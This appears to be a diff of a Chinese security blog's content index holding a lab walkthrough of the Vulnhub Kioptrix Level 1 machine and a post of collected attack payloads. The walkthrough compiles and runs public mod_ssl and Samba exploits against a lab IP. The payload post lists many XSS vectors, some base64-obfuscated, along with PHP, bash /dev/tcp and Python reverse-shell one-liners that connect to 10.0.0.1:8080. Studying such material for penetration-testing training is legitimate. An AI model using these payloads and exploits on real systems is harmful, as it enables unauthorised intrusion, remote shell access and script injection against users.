-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---寻找低版本的框架或者容器查找[exp]---</span><br><span class="line">nikto -host <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br><span class="line">nuclei -u <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2-0.png" alt="扫描的tcp连接内容"></p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2-1.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查找exp利用</span><br><span class="line">searchsploit mod_ssl</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2.png" alt="扫描的tcp连接内容"></p>
-<p>对比可得3个可尝试exp</p>
-<hr>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc -o exploit <span class="number">47080</span>.c -lcrypto</span><br><span class="line">#运行对应版本</span><br><span class="line">./exploit -h								#帮助</span><br><span class="line">./exploit | grep apache-<span class="number">1</span>.<span class="number">3</span>.<span class="number">20</span>				#版本</span><br><span class="line">./exploit <span class="number">0</span>x6b <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span> <span class="number">80</span> -c <span class="number">50</span>			#运行</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/3.png" alt="扫描的tcp连接内容"></p>
-<p>流程是这么个流程，但是这个exp太过于久远了，难以运行</p>
-<p>所以换其它的不需要lcrypto的exp运行</p>
-<h5 id="我采用的攻击方式"><a href="#我采用的攻击方式" class="headerlink" title="我采用的攻击方式"></a>我采用的攻击方式</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#存在<span class="number">139</span>端口samba服务，且得知系统为linux框架</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/1.png" alt="扫描的tcp连接内容"></p>
-<p>搜索该服务：</p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-0.png" alt="扫描的tcp连接内容"></p>
-<p>发现非常多的exp，但是nmap没有版本，难不成这么多exp一个个试？</p>
-<p>有两种方法msfconsole&#x2F;nuclei跑出版本，msfconsole跑出版本前提是需要存在版本泄露的漏洞，虽然nuclei也是一样，但是架不住快呀:</p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-1.png" alt="扫描的tcp连接内容"></p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-2.png" alt="扫描的tcp连接内容"></p>
-<hr>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#或者nuclei直接跑出版本号</span><br><span class="line">nuclei.exe -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>:<span class="number">139</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-3.png" alt="扫描的tcp连接内容"></p>
-<p>跑出版本2.2.1a就可以直接跑小于2.2.8这个版本的了</p>
-<p>直接编译运行即可</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc <span class="number">10</span>.c -o samba_exp		#-o为输出文件</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/5.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看帮助</span><br><span class="line">./samba_exp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/5-2.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#运行</span><br><span class="line">./samba_exp -b0 <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>	#-b为目标，<span class="number">0</span>为linux</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/6.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">找出版本后直接在msfconsole上搜索exp跑也可以</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/0.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">其他的服务版本都很低，可以信息搜集后用工具跑，低权限就uname -a查看内核版本，看searchsploit里面有无提权exp，或者直接cs上线跑提权工具</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1.RCE前提是存在漏洞</p>
-<p>2.渗透主要是信息搜集</p>
-<p>3.主要考核了工具使用</p>
-<h3 id="参考的文章"><a href="#参考的文章" class="headerlink" title="参考的文章"></a>参考的文章</h3><p><a href="https://www.cnblogs.com/KUANTECH/p/17941528">Lab 1-Vulnhub - Kioptix Level 1 - KUANTECH - 博客园</a></p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>Red team</tag>
       </tags>
   </entry>
   <entry>
@@ -1325,6 +1299,161 @@
       </categories>
       <tags>
         <tag>Red team</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>oscp靶场训练</title>
+    <url>/2025/08/25/oscp_attack-log/</url>
+    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h2><p>准备条件：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#kali系统</span><br><span class="line">kali-linux</span><br><span class="line"></span><br><span class="line">#必要的组件和更新	//运行exp</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class="line">sudo apt install -y build-essential git curl wget unzip vim tmux <span class="built_in">net</span>-tools htop</span><br><span class="line">sudo apt install -y python3 python3-pip python3-venv</span><br><span class="line">sudo apt install -y openjdk-<span class="number">17</span>-jdk</span><br><span class="line">sudo apt install -y libssl-dev</span><br><span class="line">sudo apt install -y netcat-traditional socat tcpdump wireshark</span><br><span class="line">sudo apt install -y nmap traceroute dnsutils</span><br><span class="line">sudo apt install -y exploitdb sqlmap john hydra metasploit-framework</span><br><span class="line">以及其他自定义的必要组件</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h1 id="Kioptrix"><a href="#Kioptrix" class="headerlink" title="Kioptrix"></a>Kioptrix</h1><h3 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h3><p>—–<strong>简单的使用工具排查漏洞</strong>—–</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#快速扫描</span><br><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">#全端口扫描</span><br><span class="line">nmap -p <span class="number">1</span>-<span class="number">65535</span> -T4 -A -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span></span><br></pre></td></tr></table></figure>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/1.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---寻找低版本的框架或者容器查找[exp]---</span><br><span class="line">nikto -host <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br><span class="line">nuclei -u <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2-0.png" alt="扫描的tcp连接内容"></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2-1.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查找exp利用</span><br><span class="line">searchsploit mod_ssl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2.png" alt="扫描的tcp连接内容"></p>
+<p>对比可得3个可尝试exp</p>
+<hr>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc -o exploit <span class="number">47080</span>.c -lcrypto</span><br><span class="line">#运行对应版本</span><br><span class="line">./exploit -h								#帮助</span><br><span class="line">./exploit | grep apache-<span class="number">1</span>.<span class="number">3</span>.<span class="number">20</span>				#版本</span><br><span class="line">./exploit <span class="number">0</span>x6b <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span> <span class="number">80</span> -c <span class="number">50</span>			#运行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/3.png" alt="扫描的tcp连接内容"></p>
+<p>流程是这么个流程，但是这个exp太过于久远了，难以运行</p>
+<p>所以换其它的不需要lcrypto的exp运行</p>
+<h5 id="我采用的攻击方式"><a href="#我采用的攻击方式" class="headerlink" title="我采用的攻击方式"></a>我采用的攻击方式</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#存在<span class="number">139</span>端口samba服务，且得知系统为linux框架</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/1.png" alt="扫描的tcp连接内容"></p>
+<p>搜索该服务：</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-0.png" alt="扫描的tcp连接内容"></p>
+<p>发现非常多的exp，但是nmap没有版本，难不成这么多exp一个个试？</p>
+<p>有两种方法msfconsole&#x2F;nuclei跑出版本，msfconsole跑出版本前提是需要存在版本泄露的漏洞，虽然nuclei也是一样，但是架不住快呀:</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-1.png" alt="扫描的tcp连接内容"></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-2.png" alt="扫描的tcp连接内容"></p>
+<hr>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#或者nuclei直接跑出版本号</span><br><span class="line">nuclei.exe -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>:<span class="number">139</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-3.png" alt="扫描的tcp连接内容"></p>
+<p>跑出版本2.2.1a就可以直接跑小于2.2.8这个版本的了</p>
+<p>直接编译运行即可</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc <span class="number">10</span>.c -o samba_exp		#-o为输出文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/5.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看帮助</span><br><span class="line">./samba_exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/5-2.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#运行</span><br><span class="line">./samba_exp -b0 <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>	#-b为目标，<span class="number">0</span>为linux</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/6.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">找出版本后直接在msfconsole上搜索exp跑也可以</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/0.png" alt="扫描的tcp连接内容"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">其他的服务版本都很低，可以信息搜集后用工具跑，低权限就uname -a查看内核版本，看searchsploit里面有无提权exp，或者直接cs上线跑提权工具</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1.RCE前提是存在漏洞</p>
+<p>2.渗透主要是信息搜集</p>
+<p>3.主要考核了工具使用</p>
+<h3 id="参考的文章"><a href="#参考的文章" class="headerlink" title="参考的文章"></a>参考的文章</h3><p><a href="https://www.cnblogs.com/KUANTECH/p/17941528">Lab 1-Vulnhub - Kioptix Level 1 - KUANTECH - 博客园</a></p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>Red team</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>payload记录</title>
+    <url>/2025/04/24/payload%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h1><h2 id="简单payload"><a href="#简单payload" class="headerlink" title="简单payload"></a>简单payload</h2><p><strong>自动弹窗优先级</strong></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">svg &gt; img &gt; iframe &gt; object &gt; embed &gt; video/audio &gt; details &gt; marquee &gt; math</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h5 id="常见xss的payload"><a href="#常见xss的payload" class="headerlink" title="常见xss的payload"></a>常见xss的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   #标签外常用#base64加密</span><br><span class="line">   &lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">   #img#强制错误弹</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加载弹窗</span><br><span class="line">   &lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加密payload</span><br><span class="line">   &lt;svg onload=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;</span><br><span class="line">   #svg内嵌代码1</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;animate onbegin=alert(1) attributeName=x /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码2</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;set onbegin=alert(1) /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码3</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;foreignObject onload=alert(1)&gt;&lt;/foreignObject&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #点击  # JS 协议</span><br><span class="line">   &lt;a href=&quot;javascript:alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">   &lt;a data-url=&quot;&quot; onclick=&quot;alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">   #normal</span><br><span class="line">   &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">   #鼠标移动</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot;&gt;hover me&lt;/a&gt;</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot; style=&quot;display:block;width:200px;height:50px;background:red&quot;&gt;</span><br><span class="line">       </span><br><span class="line">   #鼠标移动代码2</span><br><span class="line">   &lt;math&gt;</span><br><span class="line">     &lt;mtext onmouseover=alert(1)&gt;X&lt;/mtext&gt;</span><br><span class="line">   &lt;/math&gt;</span><br><span class="line">   </span><br><span class="line">   #特定标签</span><br><span class="line">   &lt;iframe src=about:blank onload=alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">   </span><br><span class="line">   #强制本页无限弹窗</span><br><span class="line">   #聚焦时弹xss，强制聚焦</span><br><span class="line">   &lt;input autofocus onfocus=alert(1)&gt;</span><br><span class="line">   #非 常见标签</span><br><span class="line">       #万能嵌入器#早期网页：&lt;embed src=&quot;movie.swf&quot;&gt;</span><br><span class="line">       &lt;embed src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">       #详细信息</span><br><span class="line">       &lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">       #h5视频标签</span><br><span class="line">       &lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">       #h5音频标签</span><br><span class="line">       &lt;audio src=x onerror=alert(1)&gt;</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#常见反射型</span><br><span class="line">	&quot;+onmouseover=alert/*abcd*/`xss`</span><br><span class="line">	</span><br><span class="line">	&quot;&quot;; alert`<span class="number">1</span>`; //&quot;;</span><br><span class="line">	<span class="number">0</span>||alert<span class="variable">%0D`1`//</span></span><br><span class="line"><span class="variable">	%</span><span class="number">0</span>a`$&#123;alert%<span class="number">0</span>D(<span class="number">1</span>)&#125;`</span><br><span class="line">	onload=alert`<span class="number">1</span>` //</span><br><span class="line"></span><br><span class="line">#流程中含有转义步骤</span><br><span class="line">	\u0022\u003b+alert\u00601\u0060\u003b+//</span><br></pre></td></tr></table></figure>
+
+<p>注：html解析<strong>HTML 实体编码</strong></p>
+<p>​	例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;quot;   html解码成	&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注：<strong>JavaScript Unicode 转义（\uXXXX）</strong> 和 <strong>URL 编码（%XX）</strong></p>
+<p>xxs需要注意被墙了可以尝试从转义或者解析角度注入</p>
+<p>当然文件预览的方向也可以尝试</p>
+<p>可以通过<a href="https://hackerone.com/hacktivity/cwe_discovery?id=CWE-79">网址</a>来查看以前大佬们提交的漏洞</p>
+<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://xxxxx/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>python  jsingif.py  -i  hack.gif  “javascript:alert(‘Power_Liu’)”</p>
+<p><a href="https://github.com/stayliv3/blog_material/blob/master/csp/jsingif.py">jsingif.py</a></p>
+<p>用ai改了一下，python3也可以用</p>
+<p><a href="../tool/xss/jsingif.py">jsingif.py</a></p>
+<h3 id="若页面存在预览和上传"><a href="#若页面存在预览和上传" class="headerlink" title="若页面存在预览和上传"></a>若页面存在预览和上传</h3><p>则<a href="https://github.com/cliayn/cliayn.github.io/blob/master/tool/xss/xss.pdf">xss.pdf</a></p>
+<h3 id="经典示例："><a href="#经典示例：" class="headerlink" title="经典示例："></a>经典示例：</h3><h5 id="get参数变更"><a href="#get参数变更" class="headerlink" title="get参数变更"></a>get参数变更</h5><p>示例poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.xxx.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br><span class="line">	解析：</span><br><span class="line"></span><br><span class="line">abc&#x27;%3breturn+false&#125;)%3b&#125;)%3balert`xss ;&lt;%2fscript&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="图片名称变更"><a href="#图片名称变更" class="headerlink" title="图片名称变更"></a>图片名称变更</h5><p>payload:       \ “&gt;&lt;img src&#x3D;1 onerror&#x3D;&quot; URL&#x3D;String;</p>
+<p><img src="/../image/xss/expected_request.png"></p>
+<h2 id="xss修复建议"><a href="#xss修复建议" class="headerlink" title="xss修复建议"></a>xss修复建议</h2><p>✅和⚠️表示仍可以优化</p>
+<h3 id="①-编码与解析行为"><a href="#①-编码与解析行为" class="headerlink" title="① 编码与解析行为"></a>① 编码与解析行为</h3><ul>
+<li>✅ <strong>HTML 实体会被换元（<code>&amp;#60;</code> → <code>&lt;</code>）</strong></li>
+<li>❌ <strong>URL 编码不会被解析（<code>%3C</code> 不会还原）</strong></li>
+<li>❌ <strong>实体不会再被二次解析</strong></li>
+<li>⚠️ <strong>只有在“属性上下文”里才会被解析一次</strong></li>
+</ul>
+<p>👉 这么改的用途：</p>
+<blockquote>
+<p><strong>不存在通用 DOM 二次解析链</strong></p>
+</blockquote>
+<hr>
+<h3 id="②-属性白名单（非常严格）"><a href="#②-属性白名单（非常严格）" class="headerlink" title="② 属性白名单（非常严格）"></a>② 属性白名单（非常严格）</h3><ul>
+<li>❌ 除 <code>href</code> &#x2F; <code>src</code> 外，其余属性全部被过滤</li>
+<li>❌ 所有 <code>on*</code> 事件被灭</li>
+<li>❌ style &#x2F; data-* &#x2F; 自定义属性被灭</li>
+</ul>
+<p>👉 这是 <strong>属性级白名单 sanitizer</strong></p>
+<hr>
+<h3 id="③-协议与资源策略"><a href="#③-协议与资源策略" class="headerlink" title="③ 协议与资源策略"></a>③ 协议与资源策略</h3><ul>
+<li>❌ <code>javascript:</code> ❌</li>
+<li>❌ <code>data:</code> ❌</li>
+<li>❌ URL 解码后再判断（说明是 parse 后校验）</li>
+<li>⚠️ 自动链接存在（URL → <code>&lt;a&gt;</code>）</li>
+<li>❌ 白名单标签</li>
+</ul>
+<hr>
+<h3 id="④-Flash-的处理方式"><a href="#④-Flash-的处理方式" class="headerlink" title="④ Flash 的处理方式"></a>④ Flash 的处理方式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;movie.swf&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">allowscriptaccess</span>=<span class="string">&quot;never&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">allownetworking</span>=<span class="string">&quot;internal&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">type</span>=<span class="string">&quot;application/x-shockwave-flash&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>❌<code>allowscriptaccess=&quot;never&quot;</code> → <strong>Flash 无法调用 JS</strong></li>
+<li>❌<code>allownetworking=&quot;internal&quot;</code> → <strong>不能外联</strong></li>
+<li>❌MIME 明确限制</li>
+</ul>
+<p>👉 这不是“被动过滤”，而是<strong>主动重写为安全配置</strong></p>
+<h3 id="⑤-域名白名单-CSP"><a href="#⑤-域名白名单-CSP" class="headerlink" title="⑤ 域名白名单 &#x2F; CSP"></a>⑤ 域名白名单 &#x2F; CSP</h3><ul>
+<li>❌只加载的官方脚本</li>
+</ul>
+<p>👉 防止加载外部js导致xss</p>
+<h1 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">8080</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>payload</tag>
       </tags>
   </entry>
   <entry>
@@ -1635,95 +1764,6 @@
       </tags>
   </entry>
   <entry>
-    <title>payload记录</title>
-    <url>/2025/04/24/payload%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h1><h2 id="简单payload"><a href="#简单payload" class="headerlink" title="简单payload"></a>简单payload</h2><p><strong>自动弹窗优先级</strong></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">svg &gt; img &gt; iframe &gt; object &gt; embed &gt; video/audio &gt; details &gt; marquee &gt; math</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h5 id="常见xss的payload"><a href="#常见xss的payload" class="headerlink" title="常见xss的payload"></a>常见xss的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   #标签外常用#base64加密</span><br><span class="line">   &lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">   #img#强制错误弹</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加载弹窗</span><br><span class="line">   &lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加密payload</span><br><span class="line">   &lt;svg onload=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;</span><br><span class="line">   #svg内嵌代码1</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;animate onbegin=alert(1) attributeName=x /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码2</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;set onbegin=alert(1) /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码3</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;foreignObject onload=alert(1)&gt;&lt;/foreignObject&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #点击  # JS 协议</span><br><span class="line">   &lt;a href=&quot;javascript:alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">   &lt;a data-url=&quot;&quot; onclick=&quot;alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">   #normal</span><br><span class="line">   &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">   #鼠标移动</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot;&gt;hover me&lt;/a&gt;</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot; style=&quot;display:block;width:200px;height:50px;background:red&quot;&gt;</span><br><span class="line">       </span><br><span class="line">   #鼠标移动代码2</span><br><span class="line">   &lt;math&gt;</span><br><span class="line">     &lt;mtext onmouseover=alert(1)&gt;X&lt;/mtext&gt;</span><br><span class="line">   &lt;/math&gt;</span><br><span class="line">   </span><br><span class="line">   #特定标签</span><br><span class="line">   &lt;iframe src=about:blank onload=alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">   </span><br><span class="line">   #强制本页无限弹窗</span><br><span class="line">   #聚焦时弹xss，强制聚焦</span><br><span class="line">   &lt;input autofocus onfocus=alert(1)&gt;</span><br><span class="line">   #非 常见标签</span><br><span class="line">       #万能嵌入器#早期网页：&lt;embed src=&quot;movie.swf&quot;&gt;</span><br><span class="line">       &lt;embed src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">       #详细信息</span><br><span class="line">       &lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">       #h5视频标签</span><br><span class="line">       &lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">       #h5音频标签</span><br><span class="line">       &lt;audio src=x onerror=alert(1)&gt;</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
